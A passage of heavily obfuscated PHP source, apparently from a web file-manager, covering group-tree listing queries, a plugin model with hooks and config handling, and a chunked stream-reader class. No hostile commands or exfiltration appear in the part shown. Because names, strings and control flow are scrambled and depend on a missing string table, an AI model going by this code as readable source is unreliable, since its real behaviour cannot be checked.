$F«ïĞ’çŸ = array($aˆ©›‘ ï); $this->_listDataApply($F«ïĞ’çŸ); return $F«ïĞ’çŸ[0]; } protected function _listDataApply(&$c§—•„¤») { goto Bíèã…‹«‰; Bíèã…‹«‰: $B††¬ÂÌØœ =& $_SERVER[Æ]; if (!$c§—•„¤») { return; } $eØÈÍ¬¢˜ = array_to_keyvalue($c§—•„¤», $B††¬ÂÌØœ[33], $B††¬ÂÌØœ[2101]); goto A’ÙÕ¡¤¢; cíáÃ‚§‰¼: $this->_listAppendParent($c§—•„¤»); $this->_listAppendSourceRoot($c§—•„¤», $eØÈÍ¬¢˜); goto bÒ‹ÆÜö”í; A’ÙÕ¡¤¢: $this->_listAppendChildren($c§—•„¤»); $this->_listAppendChildrenMember($c§—•„¤»); $this->_listAppendMeta($c§—•„¤», $eØÈÍ¬¢˜); goto cíáÃ‚§‰¼; bÒ‹ÆÜö”í: } private function _listAppendChildren(&$FøµŸÁ¾ø) { goto E‰Ø°Ï„œã; E‰Ø°Ï„œã: $Aªñ½®«Åã =& $_SERVER[Æ]; $a™¸¼ôÓÉ = $Aªñ½®«Åã[361]; $A¸–Ä‹¿ÒÆ = array(); goto D ªšò§…©; D ªšò§…©: $bŸ¬Õ ŒåÛ = count($FøµŸÁ¾ø); $aËÒé–äÄ = $this->tablePrefix . $this->tableName; for ($aÆ™£Ï¸º½ = 0, $cÙ«è£ê’¬ = 0; $aÆ™£Ï¸º½ < $bŸ¬Õ ŒåÛ; $aÆ™£Ï¸º½++) { $cÙ«è£ê’¬++; $Eˆ¸á¸•ÂŠ = $FøµŸÁ¾ø[$aÆ™£Ï¸º½][$Aªñ½®«Åã[2101]]; $a™¸¼ôÓÉ .= "\x53\x45\114\105\x43\124\40\x2a\x20\106\x52\x4f\115\40\50\123\105\x4c\105\103\x54\x20\47{$Eˆ¸á¸•ÂŠ}\x5f\143\x68\151\154\x64\x27\40\x61\163\x20\x68\x61\x73\x20\106\122\x4f\115\40\140{$aËÒé–äÄ}\x60\x20\167\150\x65\x72\145\x20\x70\x61\x72\145\x6e\x74\111\x44\x3d{$Eˆ¸á¸•ÂŠ}\x20\154\x69\155\151\164\x20\61\x29\40\141\x73\x20\164\x62\137{$Eˆ¸á¸•ÂŠ}\x20\x75\x6e\151\x6f\156\x20\141\x6c\x6c\x20"; if (($cÙ«è£ê’¬ >= 20 || $aÆ™£Ï¸º½ == $bŸ¬Õ ŒåÛ - 1) && $a™¸¼ôÓÉ) { $a™¸¼ôÓÉ = substr($a™¸¼ôÓÉ, 0, -strlen($Aªñ½®«Åã[449])); $bº³îãíÒ = $this->query($a™¸¼ôÓÉ); $A¸–Ä‹¿ÒÆ = array_merge($A¸–Ä‹¿ÒÆ, $bº³îãíÒ); $cÙ«è£ê’¬ = 0; $a™¸¼ôÓÉ = $Aªñ½®«Åã[33]; } } goto aÑ†Ò™´“»; aÑ†Ò™´“»: $A¸–Ä‹¿ÒÆ = array_to_keyvalue($A¸–Ä‹¿ÒÆ, $Aªñ½®«Åã[450]); foreach ($FøµŸÁ¾ø as &$a˜ÕƒŞÓèœ) { $a˜ÕƒŞÓèœ[$Aªñ½®«Åã[2183]] = isset($A¸–Ä‹¿ÒÆ[$a˜ÕƒŞÓèœ[$Aªñ½®«Åã[2101]] . $Aªñ½®«Åã[2184]]); } goto BÊê—ÉŞ‡¬; BÊê—ÉŞ‡¬: } private function _listAppendChildrenMember(&$CŠ„ŸòËÄê) { goto b¸õ‡¢ò«ñ; EàÈÉôˆøÂ: $F†Î©ğÊï× = count($CŠ„ŸòËÄê); $b—¹ÈôçĞ = $this->tablePrefix . $Fà®ö¯ñ¶›[2175]; for ($döæÇ¡”ùÁ = 0, $d¥Ş·ßçå‡ = 0; $döæÇ¡”ùÁ < $F†Î©ğÊï×; $döæÇ¡”ùÁ++) { $d¥Ş·ßçå‡++; $cÆ¥Ä¥É÷² = $CŠ„ŸòËÄê[$döæÇ¡”ùÁ][$Fà®ö¯ñ¶›[2101]]; $aäàâöââ .= "\x53\105\x4c\105\103\124\x20\x2a\40\106\122\x4f\115\40\50\123\x45\114\x45\103\x54\x20\47{$cÆ¥Ä¥É÷²}\137\143\x68\x69\154\144\x27\40\x61\163\x20\150\x61\163\x20\106\x52\x4f\115\40\140{$b—¹ÈôçĞ}\x60\40\167\x68\x65\162\x65\x20\147\x72\x6f\x75\x70\x49\x44\x3d{$cÆ¥Ä¥É÷²}\40\x6c\151\155\x69\164\40\x31\51\x20\x61\163\x20\x74\142\137{$cÆ¥Ä¥É÷²}\40\165\156\x69\x6f\156\x20\141\x6c\x6c\40"; if (($d¥Ş·ßçå‡ >= 20 || $döæÇ¡”ùÁ == $F†Î©ğÊï× - 1) && $aäàâöââ) { $aäàâöââ = substr($aäàâöââ, 0, -strlen($Fà®ö¯ñ¶›[449])); $E¶òº¦î®è = $this->query($aäàâöââ); $E£Ÿøç«©‚ = array_merge($E£Ÿøç«©‚, $E¶òº¦î®è); $d¥Ş·ßçå‡ = 0; $aäàâöââ = $Fà®ö¯ñ¶›[33]; } } goto Cä‹¢ˆù´; b¸õ‡¢ò«ñ: $Fà®ö¯ñ¶› =& $_SERVER[Æ]; $aäàâöââ = $Fà®ö¯ñ¶›[361]; $E£Ÿøç«©‚ = array(); goto EàÈÉôˆøÂ; Cä‹¢ˆù´: $E£Ÿøç«©‚ = array_to_keyvalue($E£Ÿøç«©‚, $Fà®ö¯ñ¶›[450]); foreach ($CŠ„ŸòËÄê as &$fŒ ä¯Ï•) { $fŒ ä¯Ï•[$Fà®ö¯ñ¶›[2185]] = isset($E£Ÿøç«©‚[$fŒ ä¯Ï•[$Fà®ö¯ñ¶›[2101]] . $Fà®ö¯ñ¶›[2184]]); } goto F»Œğ¨ß; F»Œğ¨ß: } private function _listAppendMeta(&$bŠÌ‘”Ò†Î, $FÏ¯Í›Ğšƒ) { $fËœÕ°»íİ =& $_SERVER[Æ]; $C«¯­ÏœÅä = array($fËœÕ°»íİ[2101] => array($fËœÕ°»íİ[7], $FÏ¯Í›Ğšƒ)); $f®‹¦…† = Model($fËœÕ°»íİ[2174])->where($C«¯­ÏœÅä)->select(); $f®‹¦…† = array_to_keyvalue_group($f®‹¦…†, $fËœÕ°»íİ[2101]); foreach ($f®‹¦…† as &$eÏ˜ºà§ØÆ) { $eÏ˜ºà§ØÆ = array_to_keyvalue($eÏ˜ºà§ØÆ, $fËœÕ°»íİ[89], $fËœÕ°»íİ[359]); } foreach ($bŠÌ‘”Ò†Î as &$dç²Åù†äİ) { $dç²Åù†äİ[$fËœÕ°»íİ[417]] = array(); if (isset($f®‹¦…†[$dç²Åù†äİ[$fËœÕ°»íİ[2101]]])) { $dç²Åù†äİ[$fËœÕ°»íİ[417]] = $f®‹¦…†[$dç²Åù†äİ[$fËœÕ°»íİ[2101]]]; } } } protected function parentLevelArray($FÙöîªÌõ°) { $F¢ã‰İ¤ª» =& $_SERVER[Æ]; $FÙöîªÌõ° = explode($F¢ã‰İ¤ª»[47], trim($FÙöîªÌõ°, $F¢ã‰İ¤ª»[47])); $FÙöîªÌõ° = array_remove_value($FÙöîªÌõ°, $F¢ã‰İ¤ª»[468]); return $FÙöîªÌõ°; } private function _listAppendParent(&$d–ó†¯œø«) { goto DÉÂ©è²¤¶; d‹¬ÉÍ‘ôã: foreach ($d–ó†¯œø« as &$dßŠ”Üõ·—) { $c‚÷‘ÓŒ‹Š = $this->parentLevelArray($dßŠ”Üõ·—[$b¿ò•Ç–¾Í[459]]); $C¶œí»…óå = $b¿ò•Ç–¾Í[33]; foreach ($c‚÷‘ÓŒ‹Š as $a¨çÂé½‰á) { $C¶œí»…óå .= $aô…çìÇ­Ù[$a¨çÂé½‰á] . $b¿ò•Ç–¾Í[8]; } if ($c‚÷‘ÓŒ‹Š) { $C¶œí»…óå .= $dßŠ”Üõ·—[$b¿ò•Ç–¾Í[28]]; } $dßŠ”Üõ·—[$b¿ò•Ç–¾Í[463]] = str_replace($b¿ò•Ç–¾Í[467], $b¿ò•Ç–¾Í[8], $C¶œí»…óå); } goto dçë„ÅÄ¯¢; d¬øÜ±ùè†: $e­”˜”ƒ˜ˆ = array(); foreach ($aô…çìÇ­Ù as $E’ˆãˆÓ³É => $a’Ó£ñíÍí) { if (!$a’Ó£ñíÍí) { $e­”˜”ƒ˜ˆ[] = $E’ˆãˆÓ³É; } } if ($e­”˜”ƒ˜ˆ) { $eÆ’ìí•ä = array($b¿ò•Ç–¾Í[2173] => array($b¿ò•Ç–¾Í[384], $e­”˜”ƒ˜ˆ)); $f¤—œ¿Êâ¬ = $this->field($b¿ò•Ç–¾Í[2186])->where($eÆ’ìí•ä)->select(); $f˜œ¿™Ù³Ï = array_to_keyvalue($f¤—œ¿Êâ¬, $b¿ò•Ç–¾Í[2101], $b¿ò•Ç–¾Í[28]); $aô…çìÇ­Ù = array_merge_index($aô…çìÇ­Ù, $f˜œ¿™Ù³Ï); } goto d‹¬ÉÍ‘ôã; DÉÂ©è²¤¶: $b¿ò•Ç–¾Í =& $_SERVER[Æ]; $aô…çìÇ­Ù = array(); foreach ($d–ó†¯œø« as &$dßŠ”Üõ·—) { $aô…çìÇ­Ù[$dßŠ”Üõ·—[$b¿ò•Ç–¾Í[2101]]] = $dßŠ”Üõ·—[$b¿ò•Ç–¾Í[28]]; $c‚÷‘ÓŒ‹Š = $this->parentLevelArray($dßŠ”Üõ·—[$b¿ò•Ç–¾Í[459]]); foreach ($c‚÷‘ÓŒ‹Š as $a¨çÂé½‰á) { if (!isset($aô…çìÇ­Ù[$a¨çÂé½‰á])) { $aô…çìÇ­Ù[$a¨çÂé½‰á] = 0; } } } goto d¬øÜ±ùè†; dçë„ÅÄ¯¢: } private function _listAppendSourceRoot(&$BïÕ¨àãÓœ, $C§•ìğ¹É•) { goto Aµ¢¼ÄÃô; Aµ¢¼ÄÃô: $Dî†ÛÎÛ¾³ =& $_SERVER[Æ]; $CÜƒ¶Á”ì = array($Dî†ÛÎÛ¾³[371] => SourceModel::TYPE_GROUP, $Dî†ÛÎÛ¾³[461] => 0, $Dî†ÛÎÛ¾³[456] => array($Dî†ÛÎÛ¾³[7], $C§•ìğ¹É•)); $aÀÜöó«ª = $Dî†ÛÎÛ¾³[2187]; goto Eï¹Ô¿ªòº; EÌà„ÑÆÓ¥: foreach ($BïÕ¨àãÓœ as &$C²¸’ÈŸÁˆ) { $C²¸’ÈŸÁˆ[$Dî†ÛÎÛ¾³[391]] = $cèƒÖîÇİ†[$C²¸’ÈŸÁˆ[$Dî†ÛÎÛ¾³[2101]]] ? $cèƒÖîÇİ†[$C²¸’ÈŸÁˆ[$Dî†ÛÎÛ¾³[2101]]] : array(); } goto cÜöŞ§ ; Eï¹Ô¿ªòº: $cèƒÖîÇİ† = Model($Dî†ÛÎÛ¾³[751])->order($Dî†ÛÎÛ¾³[2188])->field($aÀÜöó«ª)->where($CÜƒ¶Á”ì)->select(); $cèƒÖîÇİ† = array_to_keyvalue($cèƒÖîÇİ†, $Dî†ÛÎÛ¾³[456]); $cèƒÖîÇİ† = array_remove_key($cèƒÖîÇİ†, $Dî†ÛÎÛ¾³[456]); goto EÌà„ÑÆÓ¥; cÜöŞ§ : } protected function resetParentLevel() { $F‚¿¶±Ñ° =& $_SERVER[Æ]; $eÒ¹‘ÜëÉ = $F‚¿¶±Ñ°[2101]; $e„ÎìÖ’ = $this->select(); $e„ÎìÖ’ = array_to_keyvalue($e„ÎìÖ’, $eÒ¹‘ÜëÉ); foreach ($e„ÎìÖ’ as $cÊÜ¨¶…Ã) { goto f“˜°Á´Äµ; D¦•à‹‡À†: $c‰ÂàŸ–ÓØ[] = 0; $c‰ÂàŸ–ÓØ = $F‚¿¶±Ñ°[47] . implode($F‚¿¶±Ñ°[47], array_reverse($c‰ÂàŸ–ÓØ)) . $F‚¿¶±Ñ°[47]; $this->setNamePinyin($cÊÜ¨¶…Ã[$eÒ¹‘ÜëÉ], $cÊÜ¨¶…Ã[$F‚¿¶±Ñ°[28]]); goto fãîĞ„ÂÄ; f“˜°Á´Äµ: $C‘õº¸¯‘Ê = $cÊÜ¨¶…Ã; $c‰ÂàŸ–ÓØ = array(); while ($C‘õº¸¯‘Ê[$F‚¿¶±Ñ°[461]] != 0) { $c‰ÂàŸ–ÓØ[] = $C‘õº¸¯‘Ê[$F‚¿¶±Ñ°[461]]; $C‘õº¸¯‘Ê = $e„ÎìÖ’[$C‘õº¸¯‘Ê[$F‚¿¶±Ñ°[461]]]; } goto D¦•à‹‡À†; fãîĞ„ÂÄ: $this->where(array($eÒ¹‘ÜëÉ => $cÊÜ¨¶…Ã[$eÒ¹‘ÜëÉ]))->save(array($F‚¿¶±Ñ°[525] => $c‰ÂàŸ–ÓØ)); goto FÆ¶‰ï¾ì; FÆ¶‰ï¾ì: } return $e„ÎìÖ’; } public function groupNameAuto($cÆ¢‹³–, $F˜«ÔêçÄò) { $eË¥Æ³Æ¯· =& $_SERVER[Æ]; $D‚¾ ÛÖîÊ = $this->where(array($eË¥Æ³Æ¯·[368] => $cÆ¢‹³–))->getField($eË¥Æ³Æ¯·[28], !0); if (!$D‚¾ ÛÖîÊ || !in_array($F˜«ÔêçÄò, $D‚¾ ÛÖîÊ)) { return $F˜«ÔêçÄò; } for ($eÏõê™à„ù = 1; $eÏõê™à„ù <= count($D‚¾ ÛÖîÊ) + 1; $eÏõê™à„ù++) { $d¤ä’­™¼Ï = $F˜«ÔêçÄò . "\x28{$eÏõê™à„ù}\x29"; if (!in_array($d¤ä’­™¼Ï, $D‚¾ ÛÖîÊ)) { return $d¤ä’­™¼Ï; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\x70\154\x75\147\x69\x6e\x4c\x69\163\x74"; public $field = array("\x6e\141\155\145", "\163\164\141\164\x75\163", "\162\x65\147\x69\145\163\x74", "\143\157\156\146\x69\x67"); public function loadList($B¬œÈ æ´Œ = false) { $D„äğˆä«´ = array_to_keyvalue($this->listData(), $_SERVER[Æ][28]); if ($B¬œÈ æ´Œ) { return $D„äğˆä«´[$B¬œÈ æ´Œ]; } return $D„äğˆä«´; } public function init() { $F—“†³¡Î¹ =& $_SERVER[Æ]; Hook::trigger($F—“†³¡Î¹[2189]); $cÉ„İƒ­„ƒ = $this->loadPluginList(); foreach ($cÉ„İƒ­„ƒ as $f£áÁÛ¿ => $aÑÛ·õîÕ¬) { $bâŞ”…¦†Å = $this->appAllow($f£áÁÛ¿, $aÑÛ·õîÕ¬); if (!$bâŞ”…¦†Å) { continue; } foreach ($aÑÛ·õîÕ¬[$F—“†³¡Î¹[2190]] as $FŒØ›¤¦Ë¬ => $Fç¦ˆêõÇ’) { Hook::bind($FŒØ›¤¦Ë¬, $Fç¦ˆêõÇ’); } } Hook::trigger($F—“†³¡Î¹[2191]); Hook::trigger(ACTION); } public function appAllow($bÏ±»Ò, $c¡òŸîÏË, $dòÚï¥ª‰ó = true) { $DîœÀ‡È¸ =& $_SERVER[Æ]; $EƒĞ™â«÷î = PLUGIN_DIR . $bÏ±»Ò . $DîœÀ‡È¸[2192]; if (!is_array($c¡òŸîÏË) || !is_array($c¡òŸîÏË[$DîœÀ‡È¸[2190]]) || !is_file($EƒĞ™â«÷î) || $c¡òŸîÏË[$DîœÀ‡È¸[687]] != 1) { return !1; } if ($dòÚï¥ª‰ó && !Action($DîœÀ‡È¸[2193])->checkAuth($bÏ±»Ò)) { return !1; } return !0; } public function unInstall($C‰’ »­Œ¬) { $bÙºİ•Ş =& $_SERVER[Æ]; $A¨¯¿ì«ğù = $this->loadList($C‰’ »­Œ¬); if (file_exists(PLUGIN_DIR . $C‰’ »­Œ¬)) { Hook::apply($C‰’ »­Œ¬ . $bÙºİ•Ş[2194]); } $this->remove($A¨¯¿ì«ğù[$bÙºİ•Ş[367]]); } public function changeStatus($cØÇ’Š±Š´, $F†‚Ô‘¸¾‡) { $BˆÄ³Ã‚ë• =& $_SERVER[Æ]; $c‰œ–Ôì÷ = $this->loadList($cØÇ’Š±Š´); if ($F†‚Ô‘¸¾‡) { Hook::apply($cØÇ’Š±Š´ . $BˆÄ³Ã‚ë•[2195]); } $this->update($c‰œ–Ôì÷[$BˆÄ³Ã‚ë•[367]], array($BˆÄ³Ã‚ë•[2196] => $F†‚Ô‘¸¾‡)); } public function appRegist($Fã´çê®ô—, $bÖÜ–ààŸ°) { $bÌìòäÜ´ =& $_SERVER[Æ]; $cÍğÀµä˜µ = $this->loadList($Fã´çê®ô—); if ($cÍğÀµä˜µ) { $this->update($cÍğÀµä˜µ[$bÌìòäÜ´[367]], array($bÌìòäÜ´[2190] => $bÖÜ–ààŸ°)); } else { $a¯‡Áëƒ = array($bÌìòäÜ´[28] => $Fã´çê®ô—, $bÌìòäÜ´[2190] => $bÖÜ–ààŸ°, $bÌìòäÜ´[687] => 0, $bÌìòäÜ´[6] => $this->getConfigDefault($Fã´çê®ô—)); $this->insert($a¯‡Áëƒ); } } public function getConfigDefault($EøŞïŒÈÚ) { $dÑÒØ¦ßéÒ =& $_SERVER[Æ]; $A‡¹˜ßÑÛ = array(); $f£ìÔ¬Ó = $this->getPackageJson($EøŞïŒÈÚ); if (!$f£ìÔ¬Ó && is_array($f£ìÔ¬Ó[$dÑÒØ¦ßéÒ[2197]])) { return $A‡¹˜ßÑÛ; } foreach ($f£ìÔ¬Ó[$dÑÒØ¦ßéÒ[2197]] as $fîòî¼å˜í => $BÂëÔó“) { if (!isset($BÂëÔó“[$dÑÒØ¦ßéÒ[359]]) || isset($A‡¹˜ßÑÛ[$fîòî¼å˜í])) { continue; } $A‡¹˜ßÑÛ[$fîòî¼å˜í] = $BÂëÔó“[$dÑÒØ¦ßéÒ[359]]; } return $A‡¹˜ßÑÛ; } public function getPackageJson($DÈİËŸÕ·º) { return Hook::apply($DÈİËŸÕ·º . $_SERVER[Æ][2198]); } public function getConfig($D‚îªĞ„Æˆ, $c»—‹Ñùç¤ = false) { $DôÄ¦¢¹¬ =& $_SERVER[Æ]; $c’„œŞ¥Âã = array(); $càæÍ™ƒ ‰ = $this->loadList($D‚îªĞ„Æˆ); if ($càæÍ™ƒ ‰ && is_array($càæÍ™ƒ ‰[$DôÄ¦¢¹¬[6]])) { $c’„œŞ¥Âã = $càæÍ™ƒ ‰[$DôÄ¦¢¹¬[6]]; } if (!$c’„œŞ¥Âã || $c»—‹Ñùç¤) { $c’„œŞ¥Âã = $this->getConfigDefault($D‚îªĞ„Æˆ); } return $c’„œŞ¥Âã; } public function setConfig($D‚é’àÏïÉ, $C«»¤ªÔ´ = false) { goto aÎ˜§ô·ÙÉ; aÎ˜§ô·ÙÉ: $fğëšˆÍ¡í =& $_SERVER[Æ]; $FØÊÈ’øªë = $this->loadList($D‚é’àÏïÉ); if (!$FØÊÈ’øªë) { return !1; } goto fšˆªÙÁ•‡; dÛêïèÜÙª: $this->update($FØÊÈ’øªë[$fğëšˆÍ¡í[367]], array($fğëšˆÍ¡í[6] => $FÚ×ÑÂíå)); goto BŸ’·Üö¿; fšˆªÙÁ•‡: $FÚ×ÑÂíå = $FØÊÈ’øªë[$fğëšˆÍ¡í[6]]; if ($C«»¤ªÔ´ == !1) { $FÚ×ÑÂíå = array(); $C«»¤ªÔ´ = $this->getConfigDefault($D‚é’àÏïÉ); } foreach ($C«»¤ªÔ´ as $b…Æ­Š¿÷­ => $b…÷—¥öÊ) { $FÚ×ÑÂíå[$b…Æ­Š¿÷­] = is_string($b…÷—¥öÊ) ? trim($b…÷—¥öÊ) : $b…÷—¥öÊ; } goto dÛêïèÜÙª; BŸ’·Üö¿: } public function viewList() { goto B×¥Í‹á¯; dÔîñƒÅÂ: return $c”ùù‘ÚÊæ; goto cçÙôæà…Ì; B×¥Í‹á¯: $fÊŠÙƒ…à¨ =& $_SERVER[Æ]; $dÉµÁ‹Õ¿Î = $this->loadList(); $this->pluginScan($dÉµÁ‹Õ¿Î); goto fÇÎ¦½; fÇÎ¦½: $dÉµÁ‹Õ¿Î = $this->loadPluginList(); $c”ùù‘ÚÊæ = array(); foreach ($dÉµÁ‹Õ¿Î as $d´¦˜Ãò†› => $EĞ©ŠÚŞáŠ) { unset($EĞ©ŠÚŞáŠ[$fÊŠÙƒ…à¨[2190]], $EĞ©ŠÚŞáŠ[$fÊŠÙƒ…à¨[6]]); $e¾ˆÊßÔãµ = PLUGIN_DIR . $EĞ©ŠÚŞáŠ[$fÊŠÙƒ…à¨[28]] . $fÊŠÙƒ…à¨[2192]; if (!is_file($e¾ˆÊßÔãµ)) { continue; } $eİ§©âÚè° = Hook::apply($EĞ©ŠÚŞáŠ[$fÊŠÙƒ…à¨[28]] . $fÊŠÙƒ…à¨[2198]); if (is_array($eİ§©âÚè°)) { $c”ùù‘ÚÊæ[$d´¦˜Ãò†›] = array_merge($EĞ©ŠÚŞáŠ, $eİ§©âÚè°); } } goto dÔîñƒÅÂ; cçÙôæà…Ì: } private function loadPluginList() { $aòŠÔÀ‚ã³ =& $_SERVER[Æ]; $Aõ½‹ÀÃÒ = $this->loadList(); if (strtolower(MOD) == $aòŠÔÀ‚ã³[2199]) { return $Aõ½‹ÀÃÒ; } $AéæğÇ¨¢» = Hook::trigger($aòŠÔÀ‚ã³[2200], $Aõ½‹ÀÃÒ); if ($Aõ½‹ÀÃÒ && !$AéæğÇ¨¢») { die; } return $AéæğÇ¨¢» ? $AéæğÇ¨¢» : $Aõ½‹ÀÃÒ; } private function pluginScan($C…ø“ƒƒ·ï) { $DŞ¢ª‰öÊÏ =& $_SERVER[Æ]; recursion_dir(PLUGIN_DIR, $D‰îƒ¸· , $d‚£õ‘Ñˆ, 0); foreach ($D‰îƒ¸·  as $c¥¼¼“ˆÎ) { $dèœ‹ÜŠöŒ = get_path_this($c¥¼¼“ˆÎ); if (isset($C…ø“ƒƒ·ï[$dèœ‹ÜŠöŒ]) || !file_exists($c¥¼¼“ˆÎ . $DŞ¢ª‰öÊÏ[2201]) || !file_exists($c¥¼¼“ˆÎ . $DŞ¢ª‰öÊÏ[2192])) { continue; } Hook::apply($dèœ‹ÜŠöŒ . $DŞ¢ª‰öÊÏ[2195]); } } } goto D¦‚İ™ã®¶; F£ÄÈáˆÑØ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($FÓ…Êº½Éô, $B¼½æ«•ò = '') { goto F’´çëç”¢; F’´çëç”¢: $this->info = $this->info($FÓ…Êº½Éô); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Æ][75]]; goto f…É¦ÛÁÛŸ; fô»ÁåÇ‹: return $this->info ? !0 : !1; goto Bˆæ¤×¶ˆæ; f…É¦ÛÁÛŸ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$FÓ…Êº½Éô])) { self::$_chunkBuffer[$FÓ…Êº½Éô] = array(); } goto fô»ÁåÇ‹; Bˆæ¤×¶ˆæ: } function stream_read($FÄÛàÍµğ) { $AŞ’Ä¾Ãªˆ = $this->fileSubstr($this->pose, $FÄÛàÍµğ); $this->pose += strlen($AŞ’Ä¾Ãªˆ); return $AŞ’Ä¾Ãªˆ; } public function stream_tell() { return $this->pose; } public function stream_seek($bÎ±œ´‡Öø, $FÚÁĞÑ¶İ) { $AŸ¾·Ú ¬î =& $_SERVER[Æ]; if ($FÚÁĞÑ¶İ == SEEK_SET) { $this->pose = $bÎ±œ´‡Öø; } else { if ($FÚÁĞÑ¶İ == SEEK_CUR) { $this->pose += $bÎ±œ´‡Öø; } else { if ($FÚÁĞÑ¶İ == SEEK_END) { $this->pose = $this->info[$AŸ¾·Ú ¬î[77]] + intval($bÎ±œ´‡Öø); } } } if ($bÎ±œ´‡Öø < 0) { $this->pose = $this->info[$AŸ¾·Ú ¬î[77]] + $bÎ±œ´‡Öø; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Æ][77]]; } public function stream_close() { return !0; } public function url_stat($eôŒÔ‘Üé, $E™á–÷„ã ) { $c©ƒ‡³Â† =& $_SERVER[Æ]; $bçµ‰Û‚ç = $this->info($eôŒÔ‘Üé); return array($c©ƒ‡³Â†[1289] => 0, $c©ƒ‡³Â†[1290] => 0, $c©ƒ‡³Â†[12] => 32768 + 511, $c©ƒ‡³Â†[1291] => 0, $c©ƒ‡³Â†[1292] => 0, $c©ƒ‡³Â†[1293] => 0, $c©ƒ‡³Â†[1294] => 0, $c©ƒ‡³Â†[77] => $bçµ‰Û‚ç[$c©ƒ‡³Â†[77]], $c©ƒ‡³Â†[1295] => $bçµ‰Û‚ç[$c©ƒ‡³Â†[1167]], $c©ƒ‡³Â†[1253] => $bçµ‰Û‚ç[$c©ƒ‡³Â†[107]], $c©ƒ‡³Â†[1252] => $bçµ‰Û‚ç[$c©ƒ‡³Â†[187]], $c©ƒ‡³Â†[1296] => 0, $c©ƒ‡³Â†[1297] => 0); } static $fileInfo = array(); public function info($E·ˆ•¾£Ÿ¿) { $DñÈßêñÂò = $_SERVER[Æ][1298]; if (isset(self::$fileInfo[$E·ˆ•¾£Ÿ¿])) { return self::$fileInfo[$E·ˆ•¾£Ÿ¿]; } if (substr($E·ˆ•¾£Ÿ¿, 0, strlen($DñÈßêñÂò)) != $DñÈßêñÂò) { return !1; } self::$fileInfo[$E·ˆ•¾£Ÿ¿] = IO::info(substr($E·ˆ•¾£Ÿ¿, strlen($DñÈßêñÂò))); return self::$fileInfo[$E·ˆ•¾£Ÿ¿]; } public static function read($E¶Î¦Â§, $F†šâ« ”ğ, $cá’±—ÆÅ¬) { goto b¢ßİÎÈÉ†; AÕäæŠÛ”Ì: $EŞÁÍ…ò˜ = 8192; fseek($E·ö¡‰°ÙŠ, $F†šâ« ”ğ, SEEK_SET); $B¸ÅõĞ­°° = $dÎ×‘¬ĞÔ¨[33]; goto bÉÇ¬ššª§; bÉÇ¬ššª§: $cêöáÉÕ¾² = 0; while ($cêöáÉÕ¾² < $cá’±—ÆÅ¬) { $B«˜šÍ¡· = min($EŞÁÍ…ò˜, $cá’±—ÆÅ¬ - $cêöáÉÕ¾²); $B¸ÅõĞ­°° .= fread($E·ö¡‰°ÙŠ, $B«˜šÍ¡·); $cêöáÉÕ¾² += $B«˜šÍ¡·; } fclose($E·ö¡‰°ÙŠ); goto CŠ¦Ğ÷å–; CŠ¦Ğ÷å–: return $B¸ÅõĞ­°°; goto B†ä›’šĞ ; b¢ßİÎÈÉ†: $dÎ×‘¬ĞÔ¨ =& $_SERVER[Æ]; $E·ö¡‰°ÙŠ = fopen($E¶Î¦Â§, $dÎ×‘¬ĞÔ¨[1169]); if (!$E·ö¡‰°ÙŠ) { return $dÎ×‘¬ĞÔ¨[33]; } goto AÕäæŠÛ”Ì; B†ä›’šĞ : } public function fileSubstr($B‘´²¿¥òÁ, $b¡½Ô‹‹—ä) { goto Eì¦àä°Ó; E÷‡Ëƒ¬š: $aÚÃŠåñ˜Î = 64 * 1024; $CæÄŒ÷«÷ =& self::$_chunkBuffer[$this->path]; if (!$CæÄŒ÷«÷) { $CæÄŒ÷«÷ = array(); } goto Fì¯‹°¡¶æ; f—œ‘Çé¾¾: $b—„´‚³×´ = ceil(($B‘´²¿¥òÁ + $b¡½Ô‹‹—ä) / $aÚÃŠåñ˜Î) * $aÚÃŠåñ˜Î - $cÑ¾Ğ¬ô”; $eæ‚áôÅİã = IO::fileSubstr($this->path, $cÑ¾Ğ¬ô”, $b—„´‚³×´); $CæÄŒ÷«÷[$cÑ¾Ğ¬ô” . $D™œåó¢²•[33]] = $eæ‚áôÅİã; goto D‰†ÍÔÔ; Fì¯‹°¡¶æ: $BğŠø·‚È = 0; $C‹èµÇˆˆã = 0; $d£çÆï»Ë— = $D™œåó¢²•[33]; goto f òœ—¥À¦; D‰†ÍÔÔ: ksort($CæÄŒ÷«÷); $fäº‡ò½Œ = substr($eæ‚áôÅİã, $B‘´²¿¥òÁ - $cÑ¾Ğ¬ô”, $b¡½Ô‹‹—ä); return $fäº‡ò½Œ; goto cóòÖ©ïÀÅ; f òœ—¥À¦: foreach ($CæÄŒ÷«÷ as $BğŠø·‚È => $d£çÆï»Ë—) { $BğŠø·‚È = intval($BğŠø·‚È); $C‹èµÇˆˆã = $BğŠø·‚È + strlen($d£çÆï»Ë—); if ($B‘´²¿¥òÁ >= $C‹èµÇˆˆã) { continue; } if ($B‘´²¿¥òÁ >= $BğŠø·‚È && $B‘´²¿¥òÁ + $b¡½Ô‹‹—ä <= $C‹èµÇˆˆã) { return substr($d£çÆï»Ë—, $B‘´²¿¥òÁ - $BğŠø·‚È, $b¡½Ô‹‹—ä); } break; } if (count($CæÄŒ÷«÷) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($D™œåó¢²•[1299], $D™œåó¢²•[1300] . count($CæÄŒ÷«÷) . "\x3b\x73\164\x61\162\164\x3d{$B‘´²¿¥òÁ}\54\154\145\156\x67\x74\x68\75{$b¡½Ô‹‹—ä}\73\160\x6f\163\145\x3a{$BğŠø·‚È}\x7e{$C‹èµÇˆˆã}"); throw new Exception($D™œåó¢²•[1301]); } $cÑ¾Ğ¬ô” = intval($B‘´²¿¥òÁ / $aÚÃŠåñ˜Î) * $aÚÃŠåñ˜Î; goto f—œ‘Çé¾¾; d…ïÙ­‰‡‚: if ($B‘´²¿¥òÁ + $b¡½Ô‹‹—ä > $AÇº°¼Ä²¨) { $b¡½Ô‹‹—ä = $AÇº°¼Ä²¨ - $B‘´²¿¥òÁ; } if ($b¡½Ô‹‹—ä <= 0) { return $D™œåó¢²•[33]; } if ($B‘´²¿¥òÁ < 0 || $B‘´²¿¥òÁ >= $AÇº°¼Ä²¨ || 